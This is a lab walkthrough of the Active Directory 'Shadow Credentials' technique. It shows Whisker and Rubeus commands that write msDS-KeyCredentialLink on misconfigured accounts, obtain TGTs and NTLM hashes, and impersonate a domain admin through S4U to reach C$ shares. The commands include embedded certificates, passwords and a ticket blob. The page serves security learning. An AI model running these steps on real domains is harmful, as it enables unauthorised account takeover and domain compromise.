---
description: Persistence, lateral movement
---

# Shadow Credentials

This is a quick lab to familiarize with a technique called [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) written about by [Elad Shamir](https://medium.com/@elad.shamir?source=post\_page-----8ee1a53566ab--------------------------------). This technique allows an attacker to take over an AD user or computer account if the attacker can modify the target object's (user or computer account) attribute `msDS-KeyCredentialLink` and append it with alternate credentials in the form of certificates.

## Pre-requisites

Besides the ability to write the attribute `msDS-KeyCredentialLink` on a target user or computer, for this technique to work, the environment must be set up as follows:

* Domain must have Active Directory Certificate Services and Certificate Authority configured.
* Domain must have at least one DC running with Windows Server 2016 that supports PKINIT.

## User Account Take Over

### Overview

* `SAC1$` - is a computer account that is misconfigured and can be taken over. `Everyone` can edit its attribute `msDS-KeyCredentialLink`. This machine account is member of Domain Admins group, therefore this is the account that we will take over in this lab, effectively elevating privileges to Domain Admin.

![Everyone is allowed to write to SAC1$ computer account object](<../../.gitbook/assets/image (1084).png>)

* `regular.user` - a low privileged user that we will use to execute the technique from.
* `user-server` - the computer from which the technique will be executed with privileges of `regular.user`.
* `first-dc` - domain controller that we will compromise using a compromised `sac1$` computer account.

### Walkthrough

Since `Everyone` is allowed to `WRITE` to the `SAC1$` computer account (as mentioned in the overview section), we can execute the technique from any low privileged user's security context and elevate privileges to `Domain Admin`.

Let's add the shadow credentials (remember, they will be added by modifying the `msDS-KeyCredentialLink` attribute) to the vulnerable computer account `sac1$` using a tool called [whisker](https://github.com/eladshamir/Whisker):

{% code title="regular.user@first.local" %}
```
Whisker.exe add /target:sac1$
```
{% endcode %}

Below shows that whisker successfully updated the `msDS-KeyCredentialLink` attribute and added the shadow credentials for that account.

At the same time, whisker spits out a `rubeus` command that we can then use against the target account `sac1$` to pull its TGT and/or reveal its NTLM hash (for use in Pass The Hash attacks):

![Adding shadow credentials to sac1$ computer account](<../../.gitbook/assets/image (1089) (1) (1).png>)

After the shadow credential has been added to the account, we can confirm that the `msDS-KeyCredentialLink` was indeed added/written to:

{% code title="regular.user@first.local" %}
```
get-netcomputer sac1
```
{% endcode %}

![SAC1$ with shadow credential set in the attribute msDS-KeyCredentialLink](<../../.gitbook/assets/image (1089) (1).png>)

We're now ready to take over the `sac1$` computer account and elevate to `Domain Admin`. Before that, let's confirm we cannot access the `c$` share on the domain controller `first-dc.first.local` with `regular.user` privileges:

![Attempt to list c$ on the domain controller before shadow credentials attack - fail](<../../.gitbook/assets/image (1088) (1).png>)

Let's now pull a TGT for `SAC1$` using the shadow credentials that we've just added and try accessing the `c$` on the domain controller `first-dc` once again:

{% code title="regular.user@first.local" %}
```
Rubeus.exe asktgt /user:sac1$ /certificate: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 /password:"FordjX0Vp2VSncVV" /domain:first.local /dc:First-DC.first.local /getcredentials /show /ptt
```
{% endcode %}

![Attempt to list c$ on the domain controller after shadow credentials attack - success](<../../.gitbook/assets/image (1087) (1).png>)

## Computer Account Take Over

As mentioned earlier, computer accounts and therfore computers themselves can too be compromised using shadow credentials and this section shows how to do it.

### Overview

* `User-server2$` - AD computer object that is vulnerable - `Everyone` has full control over it. This is the computer we will take over and gain access to its administrative `c$` share.

![user-server2$ is over-permissioned and can be taken over by abusing Shadow Credentials](<../../.gitbook/assets/image (1087).png>)

* `User-server` - computer from which the technique will be executed.
* `Regular.user` - a low privileged user account logged on to `user-server`.

### Walkthrough

First step is the same as in the user account take over - add shadow credential to the target computer `user-server2$`:

```
Whisker.exe add /target:user-server2$
```

Once shadow credentials are added to `user-server2$`, let's pull its TGT:

```
Rubeus.exe asktgt /user:user-server2$ /certificate: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 /password:"ckXTY5LJOKKbG2TN" /domain:first.local /dc:First-DC.first.local /getcredententials /show /ptt /nowrap
```

![TGT is retrieved for user-server2$](<../../.gitbook/assets/image (1086).png>)

Before gaining administrative access over the computer `user-server2`, let's check we do not already have admin privileges there:

![Attempt to list c$ admin share fails](<../../.gitbook/assets/image (1085) (1).png>)

Let's now request a TGS for `admin@first.local` (domain admin) to the `CIFS` (SMB) service on the target computer `user-server2.first.local` that we want to take over and attempt listing its administrative `c$` once again:

```
Rubeus.exe s4u /dc:first-dc.first.local /ticket:doIGjjCCBoqgAwIBBaEDAgEWooIFoTCCBZ1hggWZMIIFlaADAgEFoQ0bC0ZJUlNULkxPQ0FMoiAwHqADAgECoRcwFRsGa3JidGd0GwtmaXJzdC5sb2NhbKOCBVswggVXoAMCARKhAwIBAqKCBUkEggVFj2/TcjTtZhD8bSHxyBIg4uF/JDBiiiUvA0ODHQGwc3yGdMARzyeyK4DBIeo3uEfIescMb0AAohC6WYFw/1tTqlPdJmTdc/zggkJBU97V/Boq8dXiS13cA3GNkr/cHkicdT/9NpQQZO0FNknD0dtcgj6SFsB1h9IEGeIRLP4yhezlLE+VhmHAUcUP7tXfLgpxHSydqz+fdUtBzoGEFWny8Ge1UE6phSDVe4fltvlqRqNtTD9uCp/L6cTAPbFP/qLIroIp2+TrJHXZlAj44zoBCmjfIWulD6jiQn61XHuSiT4WfVLjaayST2gB2PiW/86ARtdAZrxZWvZLMUrc5q1ABqSgwEZkFq6fe6b5+fOpMrUXxAdYRP5WxQcQ9/XZ7tNu1+3WFBGyH+7DxQYxYxR+V/Y4uQ1JxzaD9LRsPPIn3HyUt7t71iqMq/xQ9eXoLkK9cuSBx0ACm/rzr0JQlIcI8S95HH8Fy5fNK4Ztu4e30CFOrbnqUSYjAXBqw9iJm6mPPrk9xRYFa8JCq+k/v0EYB7HeJ+DmFJOIoDU06EsrFEx19uon00z+9fY6UTfGJPB67k0t68OOFoF/34asZg29OpdD4ZFfQPqm28FPD8FFNlgJrU22mrVfi4zUnNJlm8l+Eb18iLcEsNqjwEMrLYsSm6inZDRb+vbFxZ8qbJzctxeA/B3lWyqe8rgyZYounFou4386WSWFcAaFhKCG7L/f7Fo+z9F06iV6CHJHCoZH3NCHcRoP1abTsNJaTfguoq+QkkIHLlD9XV+NwaoYDwZOAoE0xBgiY4XNegXdjQ372fmRupeKwmaRCoBFXkfX41mNUY/g5jQDsiRT8yNI/JbjjytARArEZ+CiPltytrZhIb6o5SXUq0CA7BkLk4zlC1VNOu6VDtQXNHaMpsFq/i0ba4trK9dT0NrKvY+ol5XbEt8BhLIbpNLF4VIyYrW3BZD4jvlDqpK2srdyVPyhv0zmCrmV7bt1CgrSiDpQ2ZFDTvjbqSD5gxGfz2wSZYKoH4ZNz2QiH8+vd9aq1T8erOyyYOvKNXYe/+8p6zKYf5dKzAfUobisqU9ume1AIrbLBblY98N4OtnR86Qt8rXLb121Y7psxcikZjGUDGKYoU7BaFlx9MROyjncSmukNWB1RL6sjn6asAysFwQLmZ3rXp9qZjmQw1T6CYmQn9J2m6DgEUgH2v/XMYalLpviFIZ9viuWhzfH0XJNgorH9A0/ktgjoM94MabhrdcU3j81jSHS1hJNiiOirgDgIZ5cuUuaaHd0gPH/EVqBTq4qRtAIcoh/qbV8yPOOzG5pGNtTY2i7bEVuO1OzEkvCPuzEN/aNGTw8plJ0u8SXSnkG4OyV6dvHIcIntuIRkZwgVgOjMEvx3m4NXGVZN0dU8kKf3mDx6S4biK9XFf/BuriGpUDULik274yGzSxYNBfvhQ8fr+jK7FiP5XhyuX91EhK5AU0mOsjrR4sJe0+TSgtXGr3IkOowD0IEH6QcRLF5Ry22MAkk3+KpShSnsbk+OH7Fa3QplkL2aL8J9XFtoDl+N1IAkCvPD/UfaJt9GN3tdAgs0hVq4fi8tK8Esne/cQEXDKMqp3M5xHa7igDePg2GgowEeu9YzmtzhG57pjtHSBHn2vghRx41gSv0PZ+V8Ku2vXGr+73gvXzMDXHBKCJfvl5a93a3jjw6CZ7TInJcb9vnbzA96hXjfG9iXPQukIVtS9mliJBlUa5VEavC2xm6cUBBA8W3TU4YcbYkh/vkHJ+MsOMlkFqijtnDzm6PqwdiOnON64RyPPGYx4CjgdgwgdWgAwIBAKKBzQSByn2BxzCBxKCBwTCBvjCBu6AbMBmgAwIBF6ESBBBgO4p722wBoAoAA8phVXFvoQ0bC0ZJUlNULkxPQ0FMohowGKADAgEBoREwDxsNdXNlci1zZXJ2ZXIyJKMHAwUAQOEAAKURGA8yMDIyMDYxNDE0NDkzMFqmERgPMjAyMjA2MTUwMDQ5MzBapxEYDzIwMjIwNjIxMTQ0OTMwWqgNGwtGSVJTVC5MT0NBTKkgMB6gAwIBAqEXMBUbBmtyYnRndBsLZmlyc3QubG9jYWw= /impersonateuser:admin@first.local /ptt /self /service:host/user-server2.first.local /altservice:cifs/user-server2.first.local
ls \\user-server2.first.local\c$
```

Below shows how the TGS is requested and imported to memory, which in turn enables our low privileged user `regular.user` to authenticate to the `user-server2.first.local` and list its `C$` share with an impersonated `Domain Admin` user `admin`:

![Computer Account Takeover with shadow credentials is successful](<../../.gitbook/assets/image (1090) (1) (1).png>)

Below simply shows the TGS that we have in memory for accessing CIFS service on `user-server2.first.local` while impersonating `admin@first.local`:

![S4U2Self - CIFS service requested TGS to itself on behalf of first\admin](<../../.gitbook/assets/image (1090) (1).png>)

{% hint style="info" %}
**Operating from Linux**

If you're operating from a Linux box, you may execute the Shadow credentials technique using [pyWhisker](https://github.com/ShutdownRepo/pywhisker) (whisker ported to Python) by [https://twitter.com/\_nwodtuhs](https://twitter.com/\_nwodtuhs).
{% endhint %}

## References & Credits

{% embed url="https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab" %}

Thanks to [https://twitter.com/gladiatx0r](https://twitter.com/gladiatx0r) for correcting the environment pre-requisites and mentioning [pywhisker](https://github.com/ShutdownRepo/pywhisker).
